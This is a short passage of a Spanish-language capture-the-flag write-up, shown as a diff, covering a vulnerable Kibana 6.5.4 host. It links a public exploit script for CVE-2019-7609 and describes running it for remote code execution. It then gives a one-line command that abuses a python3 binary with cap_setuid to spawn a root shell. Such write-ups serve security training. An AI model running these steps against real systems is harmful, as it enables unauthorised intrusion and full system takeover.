@@ -44,3 +44,20 @@
 |     Date: Sat, 29 Aug 2020 12:51:23 GMT
 |_    {"statusCode":404,"error":"Not Found"}
 ```
+## Exploit
+### Kibana
+Podemos encontrar que la version es la 6.5.4, esta version entra dentro de las vulnerables a el CVE-2019-7609
+Buscando encontramos el siguiente script:
+```
+https://github.com/LandGrey/CVE-2019-7609/blob/master/CVE-2019-7609-kibana-rce.py
+```
+Lo ejecutamos , abrimos nuestro listener y obtenemos un RCE
+## Privesc
+Encontramos la siguiente capability
+```
+/home/kiba/.hackmeplease/python3 = cap_setuid+ep
+```
+Ejecutamos el siguiente comando
+```
+/home/kiba/.hackmeplease/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+```
